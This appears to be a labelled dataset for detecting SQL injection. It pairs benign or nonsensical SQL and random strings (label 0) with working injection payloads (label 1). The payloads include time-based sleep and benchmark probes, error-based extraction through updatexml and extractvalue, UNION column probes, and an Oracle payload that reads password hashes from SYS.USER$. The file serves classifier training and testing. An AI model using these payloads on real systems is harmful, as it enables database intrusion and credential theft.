Payload	Attacker
SELECT * FROM  ( SELECT mistake FROM addition ) 	0
SELECT * FROM production	0
8185950000000000	0
1'||  (  select 'nfgq' where 1837  =  1837 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
torgo	0
SELECT AVG ( buy ) FROM equally SELECT SUM ( interior ) 	0
nail	0
FROM  ( SELECT DISTINCT adult FROM show ) 	0
"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""mmsh""  =  ""mmsh"	1
6138	0
"1""  )   where 3507  =  3507"	1
SELECT * FROM order	0
   SELECT COUNT ( try ) , statement FROM somewhere BY everybody	0
1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --	1
1'  )   where 6440  =  6440 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
SELECT * FROM born 3	0
"1%"" union all select null,null,null,null--"	1
"1""   )    )     )   union all select null,null#"	1
   SELECT nest, leave+ ', ' + wool+ ' ' + coffee+ ', ' + top AS greater  FROM rod	0
end  )  ||'	1
   SELECT shut, brought, flyFROM gravity WHERE floating  IS NOT NULL	0
9665	0
18708	0
SELECT * FROM steam WHERE using = 'fellow' LIMIT 3	0
SELECT * FROM  ( SELECT shown FROM anything ) 	0
12018831c	0
SELECT * FROM gather FETCH FIRST 50 PERCENT ROWS ONLY	0
1'||  (  select 'ptfi' from dual where 2234  =  2234 and 2006  =  2006	1
SELECT * FROM tree WHERE most BETWEEN '1996-07-01' AND '1996-07-31'	0
aula	0
SELECT * FROM bear WHERE magic BETWEEN 'fort' AND 'typical'	0
pruja lantadilla	0
gredos, 114 12?g	0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i	1
shukuri@velaconsultores.nl	0
33120	0
particular teresa orozco 101	0
c/ mare de deu de fatima, 165	0
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq"	1
 select * from users where id  =  1 *\. union select null,@@VERSION -- 1	1
quintina	0
SELECT * FROM taken FETCH FIRST 50 PERCENT ROWS ONLY	0
"-3930%""   )    )    order by 1#"	1
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk"	1
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --"	1
arguisuelas	0
 UNION SELECT	1
SELECT COUNT ( teach ) FROM pleasure	0
  SELECT * FROM blow WHERE draw IN  ( 'brown', 'coming', 'biggest' )  	0
SELECT * FROM riding WHERE mountain = 'feet'  OR therefore = 'equipment'	0
   SELECT thy, think, paint FROM cast WHERE top  IS NULL	0
handy.leleu@chevrolet-volt.gob	0
morgenstern9@laschinas.ba	0
42855301e	0
1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # zcyc	1
SELECT * FROM shout FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM full	0
terl6z	0
"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--"	1
47315	0
filis	0
SELECT TOP 3 * FROM pair WHERE five = 'avoid' SELECT * FROM chose	0
hoog	0
1'||  (  select 'mosp' where 6085  =  6085	1
-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#	1
1 where 1656  =  1656 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT TOP 50 PERCENT * FROM sometime SELECT * FROM herd FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM log	0
nickonov	0
"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """	1
SELECT TOP 50 PERCENT * FROM customs	0
SELECT cattle FROM look UNION SELECT adjective FROM piano ORDER BY family	0
5203670000000000	0
"-1573""  )   union all select 3928,3928,3928,3928--"	1
SELECT * FROM shinning WHERE remarkable = 'hung' FETCH FIRST 3 ROWS ONLY	0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """	1
"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """	1
SELECT * FROM  ( SELECT numeral FROM experiment ) 	0
   SELECT laid, surface, universeFROM colony WHERE five  IS NOT NULL	0
"-3090"" or make_set  (  9354  =  9354,7185  )   and ""qowe"" like ""qowe"	1
SELECT scientific FROM many	0
SELECT COUNT ( today ) FROM atomic	0
7011	0
26586	0
"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj"	1
INSERT INTO something  ( figure, sail, mad )  VALUES  ( 'announced', 'example', 'very' )  	0
1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--	1
"-7691"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #"	1
SELECT * FROM atomic WHERE machinery = 'load'  AND  ( give = 'view' OR toy = 'amount' ) 	0
1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --	1
SELECT shallow ( s )  FROM label LEFT JOIN	0
falset	0
SELECT outer ( s )  FROM object SELECT waste ( s ) 	0
SELECT ProductName, UnitPrice *  ( UnitsInStock + ISNULL ( UnitsOnOrder, 0  )  )   FROM Products;	0
SELECT AVG ( grabbed ) FROM lucky	0
select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg	1
c7em	0
equilibrio	0
"1%"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""%""  =  """	1
"1""   )    )    as rrms where 8185  =  8185 union all select null,null,null,null,null,null,null,null--"	1
1   )    )    as mlpf where 7425  =  7425	1
cruz	0
"-3315""   )    )     )   union all select 2457,2457,2457,2457,2457,2457--"	1
eliseo	0
1' in boolean mode  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
  SELECT * FROM pleasure WHERE dust IN  ( 'desk', 'paragraph', 'famous' )  	0
SELECT straight FROM locate UNION SELECT grow FROM drop ORDER BY house	0
 UPDATE single SET view = 'at'WHERE huge = 'made'	0
"  SELECT RIGHT ( ""SQL Tutorial is cool"", 4 )  AS ExtractString;"	0
3556610000000000	0
1   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   9270  =  9270	1
DELETE FROM deeply	0
SELECT AVG ( threw )  FROM thing  SELECT SUM ( fair ) 	0
z5r1174osa	0
1%'  )   order by 1--	1
671271000000000	0
SELECT height ( s )  FROM eight SELECT feed ( s ) 	0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg	1
1'  )   as gxfu where 9676  =  9676	1
INSERT INTO division  ( suggest, build, wire )  VALUES  ( 'triangle', 'stopped', 'would' )  	0
1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr	1
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) 	1
brines grimalda	0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN  ( 'front-page' )  AND  (  0  =  1  )  AND wp_posts.post_type  =  'wp_template' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC	0
SELECT TOP 50 PERCENT * FROM cold SELECT * FROM particular FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM express	0
SELECT TOP 3 * FROM equally SELECT * FROM enjoy 3SELECT * FROM duck	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8679 )  ORDER BY meta_id ASC	0
1'  )   as syer where 3141  =  3141 rlike   (  select   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --	1
1'  )   and 2577  =  7094	1
19141	0
SELECT * FROM naturally	0
  SELECT frozen AS pen, seat AS [mistake]  FROM standard	0
08zaril0o	0
SELECT AVG ( Price ) FROM angry	0
 select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'	1
argentino	0
SELECT * FROM claws WHERE mountain = 'steam'  OR pie = 'mistake'	0
SELECT * FROM five WHERE my = 'glad'  OR many = 'mouth'	0
SELECT * FROM tone WHERE swimming = 'rapidly'  AND City = 'huge'	0
breceda perdig	0
"-7544""   )    )    union all select 3808,3808,3808,3808--"	1
SELECT * FROM too WHERE similar LIKE '%material%'	0
select pg_sleep  (  5  )   and    (    (     (  'qslr'  =  'qslr	1
SELECT * FROM additional WHERE thou = 'not'	0
3572860000000000	0
3654390000000000	0
SELECT * FROM range WHERE syllable = 'sides'	0
SELECT MIN ( avoid )  AS above FROM joined	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'afdy' like 'afdy	1
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk	1
SELECT * FROM wet WHERE recent BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT COUNT ( memory ) FROM organization	0
villanueva de huerva	0
DELETE FROM frighten WHERE ordinary = 'fine'	0
SELECT * FROM experiment WHERE foot LIKE '%store%'	0
8arrascal485	0
SELECT AVG ( Price ) FROM spread	0
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""jfgk"" like ""jfgk"	1
SELECT * FROM gravity WHERE car = 'doctor'	0
SELECT exchange	0
-8943%'  )   union all select 7710,7710#	1
cluet higuerue	0
SELECT TOP 50 PERCENT * FROM according SELECT * FROM root FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM bus	0
select pg_sleep  (  5  )   and    (    (   '%'  =  '	1
08466616v	0
"1%""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""%""  =  """	1
-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645	1
1 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
1'   )    )    as eymg where 7000  =  7000	1
parra	0
SELECT * FROM east  WHERE applied NOT LIKE '[policeman]%'	0
1%' waitfor delay '0:0:5' and '%'  =  '	1
1' where 8482  =  8482 or sleep  (  5  )  #	1
4478740000000000	0
43427	0
SELECT * FROM earth  WHERE courage NOT LIKE '[atomic]%'	0
1025490000000000	0
-9389'  )   or 8859  =  3989--	1
pobla de segur 125,	0
  SELECT * FROM change WHERE newspaper IN  ( 'caught', 'ahead', 'pie' )  	0
93777834a	0
 UPDATE deeply SET dance = 'trace'WHERE truth = 'bar'	0
SELECT * FROM careful ORDER BY brass DESC	0
1%'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
SELECT * FROM them FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT AVG ( Price ) FROM operation	0
nandor	0
1'  )   where 9544  =  9544 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --	1
1'+  (  select 'qbdh' where 4006  =  4006 and 7533  =  7533  )  +'	1
INSERT INTO escape  ( pattern, partly, speech )  VALUES  ( 'tent', 'available', 'yourself' )  	0
SELECT COUNT ( six )  FROM here	0
misio+nal	0
if  (  3831  =  9321  )   select 3831 else drop function ybru--	1
1  )   as fhvr where 5544  =  5544	1
SELECT Count ( * )  AS previous	0
1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau	1
1' or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs	1
"-5148""   )    )    or 5310  =  8229"	1
1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  '%'  =  '	1
46793939w	0
1' where 5819  =  5819 and   (  1275  =  4759  )  *4759--	1
1 union all select null,null,null,null,null,null--	1
SELECT TOP 3 * FROM ought WHERE attached = 'season'	0
SELECT * FROM active FETCH FIRST 3 ROWS ONLY	0
49714	0
   SELECT prepare, worth+ ', ' + composed+ ' ' + respect+ ', ' + close AS eat  FROM right	0
20115	0
-7240'   )    )    union all select 8064,8064,8064#	1
9805	0
SELECT COUNT ( won )  FROM stick	0
tait	0
"1""  )   where 4180  =  4180 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --"	1
 SELECT column_name ( s )  FROM happened,getting	0
-8353'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'ptlz'  =  'ptlz	1
87811832v	0
SELECT TOP 3 * FROM weather	0
SELECT * FROM tin WHERE row NOT LIKE '[supper]%'	0
1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
  SELECT halfwayID AS ID, pen AS point FROM three	0
zarra	0
SELECT MIN ( harbor )  AS appropriate FROM ranch	0
"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr"	1
litago	0
SELECT * FROM bush WHERE enter = 'hundred'  OR coming = 'mud'	0
1',updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  	1
"-1072%""   )    )    or 3090  =  3539"	1
SELECT * FROM factory WHERE team = 'should'	0
FROM  ( SELECT DISTINCT fellow FROM recent ) 	0
SELECT MIN ( green )  AS eager FROM crowd	0
SELECT * FROM helpful 3 SELECT * FROM store	0
-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--	1
3302120000000000	0
 SELECT column_name ( s )  FROM remember,remain	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_4_text' LIMIT 1	0
declare @q nvarchar   (  200  )   0x730065006c00650063 ...	1
cap!tar	0
92251391r	0
SELECT COUNT ( DISTINCT gently )  FROM magnet	0
fulivio	0
1'   )    )     )   rlike   (  select   (  case when   (  5524  =  9582  )   then 1 else 0x28 end   )    )    and    (    (     (  'okoj' like 'okoj	1
1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --	1
-2951 or 4189  =  2291	1
"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv"	1
vento8eda4	0
1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'ppwh'  =  'ppwh	1
INSERT INTO what  ( who, score, separate )  VALUES  ( 'duty', 'dirty', 'turn' )  	0
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl"	1
SELECT AVG ( Price ) FROM carry	0
-6527'   )    )    union all select 5053,5053,5053,5053--	1
1,  (  select * from generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limit 1  )  	1
61371247w	0
SELECT * FROM ProductsWHERE ProductName NOT BETWEEN 'Carnarvon Tigers' AND 'Mozzarella    di Giovanni'	0
SELECT * FROM imagine	0
vilanova de segri	0
1  )   as kaew where 2658  =  2658	1
54368029p	0
michalowski@lodgeinmadrid.mu	0
e57ol40	0
SELECT * FROM compass ORDER BY available	0
  SELECT * FROM daily WHERE spin IN  ( 'spring', 'load', 'hold' )  	0
 SELECT column_name ( s )  FROM unhappy,month	0
guinea hinojar	0
gourley	0
1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --	1
   SELECT check, whistle+ ', ' + useful+ ' ' + mission+ ', ' + swimming AS ordinary  FROM family	0
 SELECT * FROM zipper ORDER BY diagram ASC, lunch DESC	0
"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx"	1
"1%""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""%""  =  """	1
cerinza	0
SELECT COUNT ( fish )  FROM tobacco	0
SELECT * FROM snow WHERE brick BETWEEN 'how' AND 'has'	0
 select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1	1
"1""   )    )    as mvxa where 3024  =  3024"	1
SELECT * FROM ordinary 3	0
cendejas de la torre	0
SELECT * FROM women WHERE    NOT group = 'verb'	0
DELETE FROM whatever	0
SELECT * FROM family	0
DELETE FROM social	0
SELECT AVG ( poem ) FROM roof SELECT SUM ( production ) 	0
SELECT AVG ( favorite ) FROM softly	0
SELECT COUNT ( active ) FROM block	0
admin'/*	1
SELECT AVG ( fort ) FROM interior	0
SELECT * FROM location WHERE zipper BETWEEN '1996-07-01' AND '1996-07-31'	0
48549953n	0
"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa"	1
